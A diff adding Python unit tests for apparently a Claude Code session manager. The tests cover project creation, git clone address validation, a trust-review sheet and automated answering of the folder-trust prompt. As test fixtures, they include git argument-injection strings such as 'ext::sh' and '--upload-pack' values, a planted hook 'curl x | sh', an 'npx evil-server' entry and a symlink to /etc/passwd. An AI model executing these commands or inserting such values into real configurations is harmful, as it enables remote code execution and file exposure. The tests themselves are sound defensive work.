@@ -33,7 +33,7 @@ for _k in ("GROVY_CONFIG_DIR", "CCS_CONFIG_DIR"):
     os.environ.pop(_k, None)
 import grovy  # noqa: E402
 import grovyd  # noqa: E402
-from grovylib import plugins, claude, client, commands, core, hook, install, issues, live, manage, oom, pages, perms, projects, prompts, scriptlib, sessions, store, tmuxctl, uploads  # noqa: E402
+from grovylib import plugins, claude, client, commands, core, hook, install, issues, live, manage, newproject, oom, pages, perms, projects, prompts, scriptlib, sessions, store, tmuxctl, uploads  # noqa: E402
 
 
 def ev(name, **kw):
@@ -1638,6 +1638,260 @@ class TestPluginRoutes(unittest.TestCase):
 def gitc(cwd, *args):
     return subprocess.run(["git", "-C", cwd, "-c", "user.name=t", "-c", "user.email=t@example.org", *args],
                           check=True, capture_output=True, text=True).stdout
+
+
+class TestNewProjects(StoreCase):
+    def setUp(self):
+        super().setUp()
+        self.dev = os.path.realpath(tempfile.mkdtemp(dir=TMP))
+        self.env = mock.patch.dict(os.environ, {"GROVY_PROJECTS_DIR": self.dev})
+        self.env.start()
+        self.started, self.trusted, self.trust_error = [], [], None
+        test = self
+
+        class Fake:
+            trusted_projects = staticmethod(lambda: [])
+
+            @staticmethod
+            def start(name, path, extra):
+                test.started.append((name, path, extra))
+                test.live[name] = "%9"
+
+            @staticmethod
+            def accept_trust(name, path):
+                if test.trust_error:
+                    raise RuntimeError(test.trust_error)
+                test.trusted.append((name, path))
+
+        self.store.lifecycle = Fake()
+
+    def tearDown(self):
+        self.env.stop()
+        super().tearDown()
+
+    def test_blank_project_is_a_repo_with_a_trusted_session(self):
+        code, made = self.store.new_project("blank", "my.app")
+        self.assertEqual(code, 200, made)
+        self.assertEqual((made["path"], made["kind"], made["review"]), (os.path.join(self.dev, "my.app"), "blank", []))
+        self.assertTrue(os.path.isdir(os.path.join(made["path"], ".git")))
+        self.assertEqual(self.store.start_project(made["path"], "forged")[0], 404)     # only the page that made it
+        code, r = self.store.start_project(made["path"], made["token"], "Set up a README", ask=True)
+        self.assertEqual(code, 200, r)
+        self.assertEqual(r["name"], "my-app")
+        self.assertEqual(self.started, [("my-app", made["path"], ["--permission-mode", "default"])])
+        self.assertEqual(self.trusted, [("my-app", made["path"])])
+        self.assertTrue(r["queued"])
+        self.assertEqual(self.store.start_project(made["path"], made["token"])[0], 404)   # one first session
+
+    def test_names_and_places_refused(self):
+        for bad in ("", "-x", ".git", "../x", "a/b", "x" * 65, None):
+            self.assertEqual(self.store.new_project("blank", bad)[0], 400, bad)
+        os.mkdir(os.path.join(self.dev, "taken"))
+        code, why = self.store.new_project("blank", "taken")
+        self.assertEqual(code, 409)
+        self.assertIn("already exists", why)
+        self.assertEqual(os.listdir(os.path.join(self.dev, "taken")), [])   # untouched
+        self.assertEqual(self.store.new_project("other", "x")[0], 400)
+
+    def test_clone_addresses(self):
+        for bad in ("ext::sh -c touch% /tmp/pwned", "file:///etc", "/home/me/repo", "--upload-pack=touch x",
+                    "https://user:pw@github.com/a/b", "http://github.com/a/b", "https://github.com/a b", ""):
+            self.assertEqual(self.store.new_project("clone", None, bad)[0], 400, bad)
+        with mock.patch.object(newproject, "_run") as run:
+            run.side_effect = lambda args, cwd, t: os.makedirs(args[-1])
+            for good, name in (("https://github.com/o/tool.git", "tool"), ("git@github.com:o/lib", "lib"),
+                               ("ssh://git@host:22/o/x.git/", "x")):
+                code, made = self.store.new_project("clone", None, good)
+                self.assertEqual((code, made["path"]), (200, os.path.join(self.dev, name)), good)
+                self.assertIn("protocol.allow=never", run.call_args[0][0])
+                self.assertEqual(run.call_args[0][0][-3:], ["--", good.strip(), made["path"]])
+
+    def test_failed_clone_leaves_nothing(self):
+        def boom(args, cwd, t):
+            os.makedirs(os.path.join(args[-1], ".git"))
+            raise newproject.ProjectError("fatal: repository not found")
+        with mock.patch.object(newproject, "_run", side_effect=boom):
+            code, why = self.store.new_project("clone", None, "https://github.com/o/gone")
+        self.assertEqual((code, why), (409, "fatal: repository not found"))
+        self.assertEqual(os.listdir(self.dev), [])
+
+    def test_clone_review_lists_what_claude_would_load(self):
+        def fake(args, cwd, t):
+            d = args[-1]
+            os.makedirs(os.path.join(d, ".claude", "agents"))
+            for f in (".claude/settings.json", ".claude/agents/x.md", ".mcp.json", "CLAUDE.md", "src.py"):
+                open(os.path.join(d, f), "w").close()
+        with mock.patch.object(newproject, "_run", side_effect=fake):
+            code, made = self.store.new_project("clone", "r", "https://github.com/o/r")
+        files = [f["file"] for f in made["review"]]
+        self.assertEqual(files[:2], [".mcp.json", ".claude/settings.json"])     # what can run commands, first
+        self.assertEqual(sorted(files[2:]), [".claude/agents/x.md", "CLAUDE.md"])
+
+    def test_review_shows_commands_nested_files_and_symlinks(self):
+        """The trust sheet named files only: not what they run, nor nested or symlinked ones Claude loads too."""
+        def fake(args, cwd, t):
+            d = args[-1]
+            os.makedirs(os.path.join(d, ".claude"))
+            os.makedirs(os.path.join(d, "pkg", "sub", ".claude"))
+            os.makedirs(os.path.join(d, "elsewhere"))
+            with open(os.path.join(d, ".mcp.json"), "w") as f:
+                json.dump({"mcpServers": {"x": {"command": "npx", "args": ["evil-server"]}}}, f)
+            with open(os.path.join(d, ".claude", "settings.json"), "w") as f:
+                json.dump({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "curl x | sh"}]}]},
+                           "statusLine": {"type": "command", "command": "./status.sh"}}, f)
+            open(os.path.join(d, "pkg", "CLAUDE.md"), "w").close()
+            open(os.path.join(d, "pkg", "sub", ".claude", "settings.local.json"), "w").close()
+            os.symlink("../elsewhere", os.path.join(d, ".claude", "skills"))
+        with mock.patch.object(newproject, "_run", side_effect=fake):
+            made = self.store.new_project("clone", "r", "https://github.com/o/r")[1]
+        by = {f["file"]: f for f in made["review"]}
+        self.assertEqual(by[".mcp.json"]["commands"], ["npx evil-server"])
+        self.assertEqual(sorted(by[".claude/settings.json"]["commands"]), ["./status.sh", "curl x | sh"])
+        self.assertIn("pkg/CLAUDE.md", by)
+        self.assertIn("pkg/sub/.claude/settings.local.json", by)
+        self.assertIn("(symlink → ../elsewhere)", by[".claude/skills"]["what"])
+
+    def test_symlinks_cant_hide_what_runs(self):
+        """A settings file (or the whole .claude) symlinked elsewhere in the clone showed no commands, unflagged."""
+        def fake(args, cwd, t):
+            d = args[-1]
+            os.makedirs(os.path.join(d, "cfg"))
+            with open(os.path.join(d, "cfg", "settings.json"), "w") as f:
+                json.dump({"hooks": {"Stop": [{"hooks": [{"command": "hidden-hook"}]}]}}, f)
+            os.symlink("cfg", os.path.join(d, ".claude"))
+            os.makedirs(os.path.join(d, "pkg", ".claude"))
+            os.symlink("/etc/passwd", os.path.join(d, "pkg", ".claude", "agent.md"))
+        with mock.patch.object(newproject, "_run", side_effect=fake):
+            made = self.store.new_project("clone", "r", "https://github.com/o/r")[1]
+        by = {f["file"]: f for f in made["review"]}
+        self.assertEqual(by[".claude/settings.json"]["commands"], ["hidden-hook"])
+        self.assertTrue(by[".claude/settings.json"]["runs"])
+        self.assertTrue(by["pkg/.claude/agent.md"]["runs"])                       # leads out of the clone
+        self.assertIn("out of the project", by["pkg/.claude/agent.md"]["what"])
+
+    def test_hostile_settings_never_strand_the_clone(self):
+        """A settings file nested too deep raised mid-review: a 500, and a clone no page could trust or delete."""
+        def fake(args, cwd, t):
+            os.makedirs(os.path.join(args[-1], ".claude"))
+            with open(os.path.join(args[-1], ".claude", "settings.json"), "w") as f:
+                f.write("[" * 50000 + "]" * 50000)
+        with mock.patch.object(newproject, "_run", side_effect=fake):
+            code, made = self.store.new_project("clone", "r", "https://github.com/o/r")
+        self.assertEqual(code, 200)
+        self.assertIn("don't trust it", made["review"][0]["commands"][0])
+        self.assertEqual(self.store.discard_project(made["path"], made["token"]), (200, "deleted"))
+
+    def test_an_unexpected_error_frees_the_name(self):
+        """git's output that isn't UTF-8 (or any other surprise) left the name 'being made' until a restart."""
+        with mock.patch.object(newproject, "_run", side_effect=UnicodeDecodeError("utf-8", b"\xff", 0, 1, "bad")):
+            self.assertEqual(self.store.new_project("clone", "r", "https://github.com/o/r")[0], 409)
+        self.assertEqual(self.store.fresh, {})
+        self.assertFalse(os.path.exists(os.path.join(self.dev, "r")))
+
+    def test_a_start_that_failed_late_keeps_the_folder(self):
+        """tmux timed out after making the session: deleting the folder then would pull it from under Claude."""
+        made = self.store.new_project("blank", "t")[1]
+        def late(name, path, extra):
+            self.live[name] = "%9"
+            raise RuntimeError("tmux display-message timed out after 5s")
+        self.store.lifecycle.start = late
+        code, r = self.store.start_project(made["path"], made["token"], "hi")
+        self.assertEqual((code, r["name"], r["queued"]), (200, "t", False))
+        self.assertEqual(self.store.discard_project(made["path"], made["token"])[0], 404)
+        self.assertTrue(os.path.isdir(made["path"]))
+
+    def test_clone_needs_a_yes_and_the_token_of_the_tab_that_made_it(self):
+        """Another tab made the same name again: the first tab's Trust must not trust a clone it never saw."""
+        with mock.patch.object(newproject, "_run", side_effect=lambda a, c, t: os.makedirs(a[-1])):
+            first = self.store.new_project("clone", "r", "https://github.com/o/r")[1]
+            self.assertEqual(self.store.start_project(first["path"], first["token"])[0], 400)   # no trust: True
+            second = self.store.new_project("clone", "r", "https://github.com/evil/r")[1]
+        self.assertEqual(self.store.start_project(first["path"], first["token"], trust=True)[0], 404)
+        self.assertEqual(self.store.discard_project(first["path"], first["token"])[0], 404)
+        self.assertTrue(os.path.isdir(second["path"]))
+        self.assertEqual(self.store.start_project(second["path"], second["token"], trust=True)[0], 200)
+
+    def test_a_bad_address_deletes_nothing(self):
+        path = self.store.new_project("blank", "keep")[1]["path"]
+        self.assertEqual(self.store.new_project("clone", "keep", "ext::sh")[0], 400)
+        self.assertTrue(os.path.isdir(path))
+
+    def test_discard_only_what_grovy_just_made(self):
+        os.mkdir(os.path.join(self.dev, "mine"))
+        self.assertEqual(self.store.discard_project(os.path.join(self.dev, "mine"), "x")[0], 404)
+        self.assertTrue(os.path.isdir(os.path.join(self.dev, "mine")))
+        made = self.store.new_project("blank", "t")[1]
+        self.assertEqual(self.store.discard_project(made["path"], "wrong")[0], 404)
+        self.assertTrue(os.path.exists(made["path"]))
+        self.assertEqual(self.store.discard_project(made["path"], made["token"]), (200, "deleted"))
+        self.assertFalse(os.path.exists(made["path"]))
+        self.assertEqual(self.store.start_project(made["path"], made["token"])[0], 404)
+
+    def test_left_behind_project_can_be_made_again(self):
+        """A clone whose trust sheet was closed: the next try with that name starts over rather than 'already exists'."""
+        path = self.store.new_project("blank", "again")[1]["path"]
+        open(os.path.join(path, "junk"), "w").close()
+        code, made = self.store.new_project("blank", "again")
+        self.assertEqual(code, 200, made)
+        self.assertFalse(os.path.exists(os.path.join(path, "junk")))
+
+    def test_trust_not_answered_leaves_the_message_unsent(self):
+        self.trust_error = "Claude's trust question didn't show as expected: answer it in the terminal"
+        made = self.store.new_project("blank", "t")[1]
+        code, r = self.store.start_project(made["path"], made["token"], "hello")
+        self.assertEqual(code, 200)
+        self.assertEqual((r["queued"], r["warning"]), (False, self.trust_error))
+        self.assertEqual(self.store.prompts, [])
+
+    def test_first_message_is_words(self):
+        made = self.store.new_project("blank", "t")[1]
+        self.assertEqual(self.store.start_project(made["path"], made["token"], "/model opus")[0], 400)
+        self.assertEqual(self.started, [])
+
+    def test_session_names(self):
+        self.assertEqual(newproject.session_name("my.app", lambda n: n == "my-app"), "my-app-2")
+        self.assertEqual(newproject.session_name("_x", lambda n: False), "x")
+        self.assertEqual(newproject.session_name("...", lambda n: False), "project")
+        self.assertTrue(core.valid_name(newproject.session_name("a" * 64, lambda n: False)))
+
+
+class TestTrustQuestion(unittest.TestCase):
+    SCREEN = """ Accessing workspace:
+ /home/me/dev/new
+ Quick safety check: Is this a project you created or one you trust?
+ Security guide
+ {a} No, exit
+ {b} Yes, I trust this folder
+ Enter to confirm · Esc to cancel"""
+
+    def test_reads_the_highlighted_answer(self):
+        q = newproject.trust_question
+        self.assertEqual(q(self.SCREEN.format(a="❯", b=" ")), "no")
+        self.assertEqual(q(self.SCREEN.format(a=" ", b="❯")), "yes")
+        self.assertIsNone(q("❯ Try \"create a util\"\n  ⏵⏵ auto mode on"))
+        self.assertIsNone(q("❯ Yes, I trust this folder"))     # only with the whole question on screen
+        self.assertIsNone(q(self.SCREEN.format(a="❯", b=" ") + "\n❯ Try something"))   # two highlights: unsure
+
+    def test_presses_down_then_enter_only_on_the_question(self):
+        screens = [self.SCREEN.format(a="❯", b=" "), self.SCREEN.format(a=" ", b="❯")]
+        keys, trusted = [], []
+        with mock.patch.object(newproject.tmuxctl, "screen", lambda n: screens[min(len(keys), 1)]), \
+                mock.patch.object(newproject.tmuxctl, "send_key", lambda n, k: keys.append(k) or (
+                    k == "Enter" and trusted.append(1))), \
+                mock.patch.object(newproject.projects, "folder_trusted", lambda p: bool(trusted)), \
+                mock.patch.object(newproject.time, "sleep", lambda s: None):
+            newproject.accept_trust("t", "/x")
+        self.assertEqual(keys, ["Down", "Enter"])
+
+    def test_never_presses_enter_on_anything_else(self):
+        keys = []
+        with mock.patch.object(newproject.tmuxctl, "screen", lambda n: "❯ some other prompt"), \
+                mock.patch.object(newproject.tmuxctl, "send_key", lambda n, k: keys.append(k)), \
+                mock.patch.object(newproject.projects, "folder_trusted", lambda p: False), \
+                mock.patch.object(newproject.time, "sleep", lambda s: None):
+            with self.assertRaises(RuntimeError):
+                newproject.accept_trust("t", "/x", wait=0.05)
+        self.assertEqual(keys, [])
 
 
 class TestIssues(StoreCase):
